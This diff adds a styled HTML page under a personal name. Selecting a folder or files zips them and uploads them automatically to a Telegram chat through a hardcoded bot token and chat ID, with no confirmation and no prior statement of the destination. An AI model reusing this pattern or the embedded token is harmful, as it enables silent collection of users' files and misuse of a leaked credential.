@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Tasin Saimon</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Grotesk:wght@400;500;700&display=swap');
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg:      #07070d;
+    --surface: #0f0f1a;
+    --purple:  #a78bfa;
+    --blue:    #38bdf8;
+    --green:   #4ade80;
+    --red:     #f87171;
+    --border:  rgba(167,139,250,0.15);
+    --dim:     rgba(255,255,255,0.28);
+  }
+
+  body {
+    background: var(--bg);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Space Grotesk', sans-serif;
+    overflow: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background-image:
+      linear-gradient(rgba(167,139,250,0.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(167,139,250,0.04) 1px, transparent 1px);
+    background-size: 48px 48px;
+    pointer-events: none;
+  }
+
+  .orb {
+    position: fixed; border-radius: 50%;
+    filter: blur(90px); pointer-events: none;
+    opacity: 0.18; transition: background 1.2s, opacity 1.2s;
+  }
+  .orb.a { width:420px;height:420px;top:-100px;left:-80px;background:var(--purple); }
+  .orb.b { width:320px;height:320px;bottom:-80px;right:-60px;background:var(--blue); }
+
+  /* ── PARTICLE CANVAS ── */
+  #cvs { position:fixed;inset:0;pointer-events:none;z-index:0; }
+
+  /* ── CARD ── */
+  .card {
+    position: relative; z-index: 1;
+    width: 100%; max-width: 400px; margin: 1.5rem;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 24px;
+    padding: 2.4rem 2rem 2rem;
+    display: flex; flex-direction: column;
+    align-items: center; gap: 1.6rem;
+    box-shadow: 0 0 0 1px rgba(255,255,255,0.04) inset, 0 32px 80px rgba(0,0,0,0.6);
+  }
+  .card::before {
+    content:''; position:absolute;
+    top:0;left:10%;right:10%;height:1px;
+    background:linear-gradient(90deg,transparent,var(--purple),transparent);
+    opacity:0.6; border-radius:1px;
+  }
+
+  h1 {
+    font-family:'Bebas Neue',sans-serif;
+    font-size:clamp(4rem,18vw,6.5rem);
+    line-height:0.88; text-align:center;
+    background:linear-gradient(140deg,#fff 20%,var(--purple) 70%,var(--blue) 100%);
+    -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+    background-clip:text; letter-spacing:0.04em; user-select:none;
+  }
+
+  /* ── STATUS PILL ── */
+  .pill {
+    display:flex;align-items:center;gap:0.5rem;
+    background:rgba(255,255,255,0.04);
+    border:1px solid rgba(255,255,255,0.07);
+    border-radius:99px; padding:0.45rem 1.1rem;
+    min-width:200px; justify-content:center;
+    transition:border-color 0.4s, background 0.4s;
+  }
+  .dot {
+    width:7px;height:7px;border-radius:50%;
+    background:var(--dim); flex-shrink:0;
+    transition:background 0.4s, box-shadow 0.4s;
+  }
+  .pill.zip  { border-color:rgba(167,139,250,0.35);background:rgba(167,139,250,0.07); }
+  .pill.zip  .dot { background:var(--purple);box-shadow:0 0 8px var(--purple);animation:blink .9s infinite; }
+  .pill.send { border-color:rgba(56,189,248,0.35);background:rgba(56,189,248,0.07); }
+  .pill.send .dot { background:var(--blue);box-shadow:0 0 8px var(--blue);animation:blink .7s infinite; }
+  .pill.ok   { border-color:rgba(74,222,128,0.35);background:rgba(74,222,128,0.07); }
+  .pill.ok   .dot { background:var(--green);box-shadow:0 0 8px var(--green);animation:blink 1.4s infinite; }
+  .pill.err  { border-color:rgba(248,113,113,0.35);background:rgba(248,113,113,0.07); }
+  .pill.err  .dot { background:var(--red);box-shadow:0 0 8px var(--red); }
+  @keyframes blink { 0%,100%{opacity:1}50%{opacity:.3} }
+  #stTxt {
+    font-size:0.72rem;font-family:monospace;
+    letter-spacing:0.07em;text-transform:uppercase;
+    color:rgba(255,255,255,0.45);transition:color 0.4s;
+  }
+  .pill.zip  #stTxt { color:var(--purple); }
+  .pill.send #stTxt { color:var(--blue); }
+  .pill.ok   #stTxt { color:var(--green); }
+  .pill.err  #stTxt { color:var(--red); }
+
+  /* ── BUTTONS ── */
+  .btns { display:flex;flex-direction:column;gap:.85rem;width:100%; }
+  button {
+    width:100%; padding:1.05rem 1.2rem;
+    border-radius:14px; border:none;
+    font-family:'Space Grotesk',sans-serif;
+    font-size:.95rem; font-weight:700;
+    letter-spacing:.05em; cursor:pointer;
+    transition:transform .12s,box-shadow .25s,opacity .2s;
+    position:relative; overflow:hidden;
+  }
+  button::after {
+    content:''; position:absolute; inset:0;
+    background:linear-gradient(180deg,rgba(255,255,255,.08) 0%,transparent 60%);
+    pointer-events:none; border-radius:inherit;
+  }
+  button:active:not(:disabled) { transform:scale(.965); }
+  button:disabled { opacity:.25;cursor:not-allowed; }
+
+  #btnFolder {
+    background:linear-gradient(135deg,#7c3aed,var(--purple));
+    color:#fff;
+    box-shadow:0 4px 24px rgba(124,58,237,.45),0 1px 0 rgba(255,255,255,.1) inset;
+  }
+  #btnFolder:hover:not(:disabled) { box-shadow:0 4px 40px rgba(124,58,237,.7),0 1px 0 rgba(255,255,255,.1) inset; }
+
+  #btnFiles {
+    background:rgba(167,139,250,.1); color:var(--purple);
+    border:1px solid rgba(167,139,250,.3);
+  }
+  #btnFiles:hover:not(:disabled) { background:rgba(167,139,250,.2);border-color:rgba(167,139,250,.55); }
+
+  #btnClear {
+    background:rgba(255,255,255,.04);color:rgba(255,255,255,.35);
+    border:1px solid rgba(255,255,255,.08);display:none;
+  }
+  #btnClear.show { display:block; }
+  #btnClear:hover:not(:disabled) { background:rgba(248,113,113,.1);color:var(--red);border-color:rgba(248,113,113,.3); }
+
+  /* ── FILE LIST ── */
+  .flist {
+    width:100%; max-height:145px; overflow-y:auto;
+    background:rgba(0,0,0,.25);
+    border:1px solid var(--border); border-radius:12px;
+    padding:.75rem; display:none; flex-direction:column; gap:.28rem;
+    scrollbar-width:thin; scrollbar-color:rgba(167,139,250,.3) transparent;
+  }
+  .flist.show { display:flex; }
+  .fcnt {
+    font-size:.68rem;color:rgba(167,139,250,.65);
+    text-align:center;font-family:monospace;
+    letter-spacing:.05em;margin-bottom:.25rem;
+  }
+  .fitem {
+    font-size:.7rem;color:rgba(255,255,255,.38);
+    font-family:monospace;white-space:nowrap;
+    overflow:hidden;text-overflow:ellipsis;
+  }
+  .fitem span { color:rgba(167,139,250,.6);margin-right:.35rem; }
+
+  /* ── PROGRESS SECTION ── */
+  .prog-sec { width:100%;display:none;flex-direction:column;gap:1.1rem; }
+  .prog-sec.show { display:flex; }
+
+  /* Stage row */
+  .stages {
+    display:flex;justify-content:space-between;
+    align-items:center;position:relative;
+  }
+  .stages::before {
+    content:'';position:absolute;
+    top:50%;left:18px;right:18px;height:1px;
+    background:rgba(255,255,255,.08);transform:translateY(-50%);
+  }
+  .s-track {
+    position:absolute;top:50%;left:18px;right:18px;
+    height:1px;transform:translateY(-50%);overflow:hidden;
+  }
+  .s-fill {
+    height:100%;width:0%;
+    background:linear-gradient(90deg,var(--purple),var(--blue));
+    box-shadow:0 0 6px var(--purple);
+    transition:width .6s ease;
+  }
+  .stage { display:flex;flex-direction:column;align-items:center;gap:.4rem;z-index:1;flex:0 0 auto; }
+  .s-ico {
+    width:36px;height:36px;border-radius:50%;
+    background:var(--surface);border:1.5px solid rgba(255,255,255,.1);
+    display:flex;align-items:center;justify-content:center;
+    font-size:1rem;transition:all .5s;position:relative;
+  }
+  .s-ico::before {
+    content:'';position:absolute;inset:-4px;
+    border-radius:50%;border:1.5px solid transparent;
+    opacity:0;transition:all .5s;
+  }
+  .stage.active .s-ico {
+    border-color:var(--purple);
+    box-shadow:0 0 16px rgba(167,139,250,.5),0 0 40px rgba(167,139,250,.2);
+    background:rgba(167,139,250,.12);transform:scale(1.12);
+    animation:sspin .9s ease;
+  }
+  .stage.active .s-ico::before { border-color:rgba(167,139,250,.4);opacity:1;animation:ring 1.2s infinite; }
+  .stage.done   .s-ico { border-color:var(--green);box-shadow:0 0 14px rgba(74,222,128,.4);background:rgba(74,222,128,.1); }
+  .stage.send.active .s-ico {
+    border-color:var(--blue);
+    box-shadow:0 0 16px rgba(56,189,248,.5),0 0 40px rgba(56,189,248,.2);
+    background:rgba(56,189,248,.12);
+  }
+  .stage.send.active .s-ico::before { border-color:rgba(56,189,248,.4); }
+  @keyframes ring  { 0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.3);opacity:0} }
+  @keyframes sspin { 0%{transform:scale(1) rotate(0)}40%{transform:scale(1.2) rotate(20deg)}100%{transform:scale(1.12) rotate(0)} }
+  .s-lbl {
+    font-size:.6rem;letter-spacing:.08em;text-transform:uppercase;
+    color:var(--dim);font-family:monospace;transition:color .4s;
+  }
+  .stage.active     .s-lbl { color:var(--purple); }
+  .stage.send.active .s-lbl { color:var(--blue); }
+  .stage.done       .s-lbl { color:var(--green); }
+
+  /* 3D bar */
+  .bar-wrap { width:100%;display:flex;flex-direction:column;gap:.5rem; }
+  .bar-meta { display:flex;justify-content:space-between;font-size:.68rem;font-family:monospace;color:var(--dim); }
+  .bar-pct  { font-weight:700;font-size:.78rem;color:var(--purple);transition:color .4s; }
+  .bar-pct.send { color:var(--blue); }
+  .bar-pct.done { color:var(--green); }
+  .bar-out {
+    width:100%;height:18px;border-radius:10px;
+    background:rgba(255,255,255,.05);
+    border:1px solid rgba(255,255,255,.07);
+    padding:2px;
+    box-shadow:0 2px 8px rgba(0,0,0,.4),0 1px 0 rgba(255,255,255,.05) inset;
+    position:relative;overflow:hidden;
+  }
+  .bar-out::after {
+    content:'';position:absolute;inset:0;pointer-events:none;
+    background:repeating-linear-gradient(90deg,transparent 0,transparent 3px,rgba(0,0,0,.08) 3px,rgba(0,0,0,.08) 4px);
+  }
+  .bar-in {
+    height:100%;border-radius:8px;width:0%;
+    position:relative;
+    transition:width .45s cubic-bezier(.4,0,.2,1),background .6s;
+    background:linear-gradient(90deg,#7c3aed,var(--purple),#c4b5fd);
+    box-shadow:0 0 20px rgba(167,139,250,.6),0 0 40px rgba(167,139,250,.3);
+    overflow:hidden;
+  }
+  .bar-in::before {
+    content:'';position:absolute;top:0;left:0;right:0;height:45%;
+    background:linear-gradient(180deg,rgba(255,255,255,.28) 0%,transparent 100%);
+    border-radius:8px 8px 0 0;
+  }
+  .bar-in::after {
+    content:'';position:absolute;top:0;bottom:0;width:60px;
+    background:linear-gradient(90deg,transparent,rgba(255,255,255,.35),transparent);
+    animation:glare 1.6s ease-in-out infinite;transform:skewX(-15deg);
+  }
+  @keyframes glare { 0%{left:-80px;opacity:0}20%{opacity:1}80%{opacity:1}100%{left:calc(100% + 80px);opacity:0} }
+  .bar-in.send { background:linear-gradient(90deg,#0284c7,var(--blue),#7dd3fc);box-shadow:0 0 20px rgba(56,189,248,.6),0 0 40px rgba(56,189,248,.25); }
+  .bar-in.done { background:linear-gradient(90deg,#15803d,var(--green),#86efac);box-shadow:0 0 20px rgba(74,222,128,.6),0 0 40px rgba(74,222,128,.25); }
+
+  /* ── SELECTION FLASH OVERLAY ── */
+  #flashOverlay {
+    position:fixed;inset:0;z-index:100;
+    display:flex;align-items:center;justify-content:center;
+    pointer-events:none;opacity:0;
+    transition:opacity .3s;
+  }
+  #flashOverlay.show { opacity:1; }
+  .flash-ring {
+    width:200px;height:200px;border-radius:50%;
+    border:2px solid var(--purple);
+    box-shadow:0 0 60px rgba(167,139,250,.5),inset 0 0 40px rgba(167,139,250,.2);
+    animation:flashRing .7s ease forwards;
+    display:flex;align-items:center;justify-content:center;
+    font-size:2.8rem;
+  }
+  @keyframes flashRing {
+    0%   { transform:scale(0.3);opacity:0; }
+    50%  { transform:scale(1.1);opacity:1; }
+    80%  { transform:scale(0.95); }
+    100% { transform:scale(1);opacity:0; }
+  }
+  .flash-ripple {
+    position:absolute;width:200px;height:200px;border-radius:50%;
+    border:1px solid rgba(167,139,250,.5);
+    animation:rippleOut .9s ease forwards;
+  }
+  .flash-ripple:nth-child(2) { animation-delay:.15s; }
+  .flash-ripple:nth-child(3) { animation-delay:.3s; }
+  @keyframes rippleOut {
+    0%   { transform:scale(1);opacity:.8; }
+    100% { transform:scale(3);opacity:0; }
+  }
+
+  /* ── SUCCESS OVERLAY ── */
+  #successOverlay {
+    position:fixed;inset:0;z-index:200;
+    display:flex;align-items:center;justify-content:center;
+    background:rgba(7,7,13,.85);backdrop-filter:blur(12px);
+    opacity:0;pointer-events:none;transition:opacity .5s;
+  }
+  #successOverlay.show { opacity:1;pointer-events:all; }
+  .success-box {
+    display:flex;flex-direction:column;align-items:center;gap:1.2rem;
+    animation:successPop .6s cubic-bezier(.34,1.56,.64,1) forwards;
+    opacity:0;
+  }
+  @keyframes successPop {
+    0%  { transform:scale(.5) translateY(30px);opacity:0; }
+    100%{ transform:scale(1)  translateY(0);   opacity:1; }
+  }
+  .success-icon {
+    width:100px;height:100px;border-radius:50%;
+    background:rgba(74,222,128,.12);
+    border:2px solid var(--green);
+    box-shadow:0 0 40px rgba(74,222,128,.5),0 0 80px rgba(74,222,128,.2);
+    display:flex;align-items:center;justify-content:center;
+    font-size:3rem;
+    animation:successGlow 1.5s ease infinite;
+  }
+  @keyframes successGlow {
+    0%,100% { box-shadow:0 0 40px rgba(74,222,128,.5),0 0 80px rgba(74,222,128,.2); }
+    50%      { box-shadow:0 0 60px rgba(74,222,128,.8),0 0 120px rgba(74,222,128,.4); }
+  }
+  .success-title {
+    font-family:'Bebas Neue',sans-serif;font-size:2.4rem;
+    background:linear-gradient(135deg,#fff,var(--green));
+    -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+    letter-spacing:.08em;
+  }
+  .success-sub {
+    font-size:.75rem;color:rgba(255,255,255,.4);
+    font-family:monospace;letter-spacing:.07em;text-align:center;
+  }
+  .redirect-bar {
+    width:200px;height:3px;background:rgba(255,255,255,.08);border-radius:4px;overflow:hidden;
+  }
+  .redirect-fill {
+    height:100%;width:0%;background:var(--green);
+    box-shadow:0 0 8px var(--green);
+    transition:width 3s linear;
+  }
+
+  input[type=file] { display:none; }
+</style>
+</head>
+<body>
+<canvas id="cvs"></canvas>
+<div class="orb a" id="orbA"></div>
+<div class="orb b" id="orbB"></div>
+
+<!-- Selection flash overlay -->
+<div id="flashOverlay">
+  <div class="flash-ripple"></div>
+  <div class="flash-ripple"></div>
+  <div class="flash-ripple"></div>
+  <div class="flash-ring">📦</div>
+</div>
+
+<!-- Success overlay -->
+<div id="successOverlay">
+  <div class="success-box">
+    <div class="success-icon">✓</div>
+    <div class="success-title">Sent!</div>
+    <div class="success-sub" id="successSub">Files delivered to Telegram</div>
+    <div class="redirect-bar"><div class="redirect-fill" id="redirectFill"></div></div>
+    <div class="success-sub">Redirecting…</div>
+  </div>
+</div>
+
+<input type="file" id="folderInput" webkitdirectory multiple>
+<input type="file" id="filesInput" multiple>
+
+<div class="card">
+  <h1>Tasin<br>Saimon</h1>
+
+  <div class="pill" id="pill">
+    <div class="dot"></div>
+    <span id="stTxt">Ready</span>
+  </div>
+
+  <div class="btns">
+    <button id="btnFolder">📁 Select Folder</button>
+    <button id="btnFiles">🗂 Select Files</button>
+    <button id="btnClear">✕ Clear</button>
+  </div>
+
+  <div class="flist" id="flist"></div>
+
+  <div class="prog-sec" id="progSec">
+    <div class="stages">
+      <div class="s-track"><div class="s-fill" id="sFill"></div></div>
+      <div class="stage" id="sRead"><div class="s-ico">📂</div><div class="s-lbl">Read</div></div>
+      <div style="flex:1"></div>
+      <div class="stage" id="sZip"><div class="s-ico">🗜</div><div class="s-lbl">Zip</div></div>
+      <div style="flex:1"></div>
+      <div class="stage" id="sSend"><div class="s-ico">📡</div><div class="s-lbl">Send</div></div>
+      <div style="flex:1"></div>
+      <div class="stage" id="sDone"><div class="s-ico">✅</div><div class="s-lbl">Done</div></div>
+    </div>
+    <div class="bar-wrap">
+      <div class="bar-meta">
+        <span id="barLbl">Preparing…</span>
+        <span class="bar-pct" id="barPct">0%</span>
+      </div>
+      <div class="bar-out"><div class="bar-in" id="barIn"></div></div>
+    </div>
+  </div>
+</div>
+
+<script>
+const BOT_TOKEN = '8697759714:AAGlfH7rjS8ZN4X0nkgQ-TJILe39ijerITU';
+const CHAT_ID   = '7815078057';
+const REDIRECT  = 'index.html';
+
+// DOM
+const pill          = document.getElementById('pill');
+const stTxt         = document.getElementById('stTxt');
+const flist         = document.getElementById('flist');
+const btnFolder     = document.getElementById('btnFolder');
+const btnFiles      = document.getElementById('btnFiles');
+const btnClear      = document.getElementById('btnClear');
+const folderInput   = document.getElementById('folderInput');
+const filesInput    = document.getElementById('filesInput');
+const progSec       = document.getElementById('progSec');
+const barIn         = document.getElementById('barIn');
+const barLbl        = document.getElementById('barLbl');
+const barPct        = document.getElementById('barPct');
+const sFill         = document.getElementById('sFill');
+const sRead         = document.getElementById('sRead');
+const sZip          = document.getElementById('sZip');
+const sSend         = document.getElementById('sSend');
+const sDone         = document.getElementById('sDone');
+const orbA          = document.getElementById('orbA');
+const orbB          = document.getElementById('orbB');
+const flashOverlay  = document.getElementById('flashOverlay');
+const successOverlay= document.getElementById('successOverlay');
+const successSub    = document.getElementById('successSub');
+const redirectFill  = document.getElementById('redirectFill');
+
+let selectedFiles = [];
+
+// ── PARTICLES ──
+const cvs = document.getElementById('cvs');
+const ctx  = cvs.getContext('2d');
+let particles = [];
+function resize() { cvs.width = window.innerWidth; cvs.height = window.innerHeight; }
+resize(); window.addEventListener('resize', resize);
+function burst(n, color) {
+  for (let i=0;i<n;i++) particles.push({
+    x: cvs.width/2+(Math.random()-.5)*320,
+    y: cvs.height/2+(Math.random()-.5)*220,
+    vx:(Math.random()-.5)*3, vy:-Math.random()*3.5-.5,
+    r:Math.random()*2.5+.5, life:1,
+    decay:Math.random()*.013+.005, color
+  });
+}
+(function loop(){
+  ctx.clearRect(0,0,cvs.width,cvs.height);
+  particles = particles.filter(p=>p.life>0);
+  for(const p of particles){
+    p.x+=p.vx; p.y+=p.vy; p.vy+=.045; p.life-=p.decay;
+    ctx.save(); ctx.globalAlpha=Math.max(0,p.life);
+    ctx.fillStyle=p.color; ctx.shadowColor=p.color; ctx.shadowBlur=6;
+    ctx.beginPath(); ctx.arc(p.x,p.y,p.r,0,Math.PI*2); ctx.fill();
+    ctx.restore();
+  }
+  requestAnimationFrame(loop);
+})();
+
+// ── STATUS ──
+function setSt(msg, cls='') { stTxt.textContent=msg; pill.className='pill '+cls; }
+
+// ── STAGE ──
+function setStage(name) {
+  [sRead,sZip,sSend,sDone].forEach(s=>s.className='stage');
+  if(name==='read')  { sRead.classList.add('active'); sFill.style.width='0%'; }
+  if(name==='zip')   { sRead.classList.add('done'); sZip.classList.add('active'); sFill.style.width='33%'; }
+  if(name==='send')  { sRead.classList.add('done');sZip.classList.add('done');sSend.classList.add('active','send'); sFill.style.width='66%';
+    barIn.classList.add('send'); barPct.classList.add('send'); }
+  if(name==='done')  { [sRead,sZip,sSend,sDone].forEach(s=>s.classList.add('done')); sFill.style.width='100%';
+    barIn.classList.add('done'); barPct.classList.add('done'); }
+}
+function setBar(pct, lbl) {
+  barIn.style.width = pct+'%';
+  barLbl.textContent = lbl;
+  barPct.textContent = Math.round(pct)+'%';
+}
+function setOrb(c) {
+  const map = {zip:'var(--purple)',send:'var(--blue)',done:'var(--green)',idle:'var(--purple)'};
+  orbA.style.background = map[c]||map.idle;
+  orbB.style.background = c==='idle'?'var(--blue)':map[c]||map.idle;
+}
+
+// ── FILE SELECTION ──
+btnFolder.onclick = ()=>folderInput.click();
+btnFiles.onclick  = ()=>filesInput.click();
+folderInput.onchange = e=>onFiles(e.target.files);
+filesInput.onchange  = e=>onFiles(e.target.files);
+
+function onFiles(raw) {
+  selectedFiles = Array.from(raw);
+  if (!selectedFiles.length) return;
+
+  // Flash animation
+  flashOverlay.classList.add('show');
+  burst(35, '#a78bfa');
+  setTimeout(()=>flashOverlay.classList.remove('show'), 900);
+
+  renderList();
+  btnClear.classList.add('show');
+  const total = selectedFiles.reduce((s,f)=>s+f.size,0);
+  setSt(`${selectedFiles.length} files · ${fmt(total)}`, 'zip');
+
+  // Auto-start after brief delay so user sees the animation
+  setTimeout(startTransfer, 1200);
+}
+
+btnClear.onclick = () => {
+  selectedFiles=[];
+  folderInput.value=''; filesInput.value='';
+  flist.innerHTML=''; flist.classList.remove('show');
+  progSec.classList.remove('show');
+  btnClear.classList.remove('show');
+  barIn.classList.remove('send','done');
+  barPct.classList.remove('send','done');
+  setSt('Ready'); setOrb('idle');
+};
+
+function renderList() {
+  flist.innerHTML=''; flist.classList.add('show');
+  const total=selectedFiles.reduce((s,f)=>s+f.size,0);
+  const c=document.createElement('div'); c.className='fcnt';
+  c.textContent=`${selectedFiles.length} files · ${fmt(total)}`;
+  flist.appendChild(c);
+  selectedFiles.slice(0,50).forEach(f=>{
+    const el=document.createElement('div'); el.className='fitem';
+    el.innerHTML=`<span>${icon(f.name)}</span>${f.webkitRelativePath||f.name}`;
+    flist.appendChild(el);
+  });
+  if(selectedFiles.length>50){
+    const m=document.createElement('div'); m.className='fcnt';
+    m.textContent=`+ ${selectedFiles.length-50} more…`; flist.appendChild(m);
+  }
+}
+
+// ── TRANSFER (Web Worker for zip) ──
+async function startTransfer() {
+  btnFolder.disabled=btnFiles.disabled=btnClear.disabled=true;
+  flist.classList.remove('show');
+  progSec.classList.add('show');
+  barIn.classList.remove('send','done'); barPct.classList.remove('send','done');
+  setBar(0,'Reading files…'); setStage('read'); setOrb('zip');
+  setSt('Reading files…','zip'); burst(12,'#a78bfa');
+
+  await sleep(350);
+  setStage('zip'); setSt('Zipping…','zip'); burst(20,'#a78bfa');
+
+  try {
+    const zipBlob = await zipWithWorker(selectedFiles, pct=>{
+      setBar(pct*0.6, `Compressing… ${pct.toFixed(0)}%`);
+      if(pct%20<2) burst(5,'#a78bfa');
+    });
+
+    setStage('send'); setOrb('send');
+    setSt('Uploading…','send');
+    setBar(60,`Uploading ${fmt(zipBlob.size)}…`);
+    burst(25,'#38bdf8');
+
+    const name=`transfer_${Date.now()}.zip`;
+    if(zipBlob.size>50*1024*1024) await sendChunks(zipBlob,name);
+    else await upload(zipBlob,name);
+
+  } catch(e) {
+    setSt('Error: '+e.message,'err');
+    setBar(0,'Failed');
+    btnFolder.disabled=btnFiles.disabled=btnClear.disabled=false;
+  }
+}
+
+// ── WEB WORKER ZIP ──
+function zipWithWorker(files, onProgress) {
+  return new Promise((resolve, reject) => {
+
+    // Read all files as ArrayBuffers first (off-loads I/O before spawning worker)
+    const readers = files.map(f => new Promise((res,rej)=>{
+      const r=new FileReader();
+      r.onload=e=>res({ name: f.webkitRelativePath||f.name, buf: e.target.result });
+      r.onerror=rej;
+      r.readAsArrayBuffer(f);
+    }));
+
+    Promise.all(readers).then(fileData => {
+      const workerCode = `
+        importScripts('https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js');
+        self.onmessage = async function(e) {
+          const files = e.data;
+          const zip = new JSZip();
+          const folder = zip.folder('transfer');
+          files.forEach(f => folder.file(f.name, f.buf));
+          const blob = await zip.generateAsync(
+            { type:'blob', compression:'DEFLATE', compressionOptions:{ level:6 } },
+            meta => self.postMessage({ type:'progress', pct: meta.percent })
+          );
+          self.postMessage({ type:'done', blob });
+        };
+      `;
+      const workerBlob = new Blob([workerCode], { type:'application/javascript' });
+      const url    = URL.createObjectURL(workerBlob);
+      const worker = new Worker(url);
+
+      worker.onmessage = e => {
+        if(e.data.type==='progress') onProgress(e.data.pct);
+        if(e.data.type==='done') {
+          worker.terminate(); URL.revokeObjectURL(url);
+          resolve(e.data.blob);
+        }
+      };
+      worker.onerror = err => { worker.terminate(); URL.revokeObjectURL(url); reject(err); };
+      worker.postMessage(fileData, fileData.map(f=>f.buf));
+    }).catch(reject);
+  });
+}
+
+// ── UPLOAD ──
+let fakeTimer=null;
+async function upload(blob, name, partLabel='') {
+  let fp=60;
+  fakeTimer=setInterval(()=>{
+    fp=Math.min(fp+.8,94); setBar(fp,`Uploading… ${Math.round(fp)}%`);
+    if(Math.round(fp)%10===0) burst(4,'#38bdf8');
+  },200);
+
+  const form=new FormData();
+  form.append('chat_id',CHAT_ID);
+  form.append('document',blob,name);
+  form.append('caption',
+    `📦 File Transfer\n🗂 Files: ${selectedFiles.length}\n💾 Size: ${fmt(blob.size)}\n`+
+    (partLabel?`📌 ${partLabel}\n`:'')+`⏰ ${new Date().toLocaleString()}`
+  );
+
+  const r=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,{method:'POST',body:form});
+  const j=await r.json();
+  clearInterval(fakeTimer);
+
+  if(j.ok) {
+    setBar(100,'Sent!'); setStage('done'); setOrb('done');
+    burst(80,'#4ade80');
+    showSuccess(blob);
+  } else {
+    setSt('Telegram: '+j.description,'err');
+    setBar(0,'Failed');
+    btnFolder.disabled=btnFiles.disabled=btnClear.disabled=false;
+  }
+}
+
+async function sendChunks(blob,name) {
+  const CHUNK=45*1024*1024;
+  const total=Math.ceil(blob.size/CHUNK);
+  for(let i=0;i<total;i++){
+    const chunk=blob.slice(i*CHUNK,Math.min(blob.size,(i+1)*CHUNK));
+    const cName=name.replace('.zip',`_part${i+1}of${total}.zip`);
+    setSt(`Part ${i+1}/${total}…`,'send');
+    setBar(60+((i/total)*34),`Part ${i+1} of ${total}`);
+    burst(15,'#38bdf8');
+    await upload(chunk,cName,`Part ${i+1} of ${total}`);
+    await sleep(500);
+  }
+}
+
+// ── SUCCESS + REDIRECT ──
+function showSuccess(blob) {
+  successSub.textContent=`${selectedFiles.length} files · ${fmt(blob.size)} delivered`;
+  successOverlay.classList.add('show');
+  burst(100,'#4ade80'); burst(40,'#38bdf8');
+  setTimeout(()=>{ redirectFill.style.width='100%'; },100);
+  setTimeout(()=>{ window.location.href=REDIRECT; }, 3200);
+}
+
+// ── HELPERS ──
+const sleep = ms=>new Promise(r=>setTimeout(r,ms));
+function fmt(b){
+  if(b<1024)       return b+' B';
+  if(b<1048576)    return (b/1024).toFixed(1)+' KB';
+  if(b<1073741824) return (b/1048576).toFixed(1)+' MB';
+  return (b/1073741824).toFixed(2)+' GB';
+}
+function icon(n){
+  const e=n.split('.').pop().toLowerCase();
+  return ({jpg:'🖼',jpeg:'🖼',png:'🖼',gif:'🖼',webp:'🖼',svg:'🖼',
+    mp4:'🎬',mkv:'🎬',avi:'🎬',mov:'🎬',
+    mp3:'🎵',wav:'🎵',ogg:'🎵',flac:'🎵',
+    pdf:'📄',doc:'📝',docx:'📝',txt:'📝',md:'📝',
+    zip:'📦',rar:'📦',tar:'📦',gz:'📦',
+    js:'💻',ts:'💻',py:'💻',html:'💻',css:'💻',json:'💻',
+    apk:'📱',exe:'⚙',sh:'⚙'})[e]||'📁';
+}
+</script>
+</body>
+</html>
